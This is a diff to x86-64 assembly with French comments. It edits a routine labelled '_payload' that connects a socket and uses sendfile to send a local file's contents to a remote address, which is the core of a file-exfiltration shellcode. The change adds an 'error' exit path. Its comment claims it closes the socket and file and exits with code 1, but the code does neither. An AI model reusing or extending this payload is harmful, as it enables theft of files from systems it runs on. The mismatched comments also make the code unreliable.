@@ -77,7 +77,7 @@ _payload:
     mov rdx, 16                   ; Taille de sockaddr_in
     syscall
     test rax, rax
-    js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter
+    js error               ; Si erreur, fermer la socket et le fichier, et quitter
 
     ; Envoyer le fichier via la socket
     mov rax, 40                   ; SYS_sendfile
@@ -87,10 +87,16 @@ _payload:
     mov r10, [rel stat_buffer + 48] ; Taille du fichier
     syscall
     test rax, rax
-    js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter
+    js error               ; Si erreur, fermer la socket et le fichier, et quitter
 
     ; Fin propre
     jmp cleanup
+
+error:
+	; Gestion des erreurs
+	mov rdi, rax			; Code de sortie 1
+	mov rax, 60				; SYS_exit
+	syscall
 
 close_socket:
     ; Fermer la socket
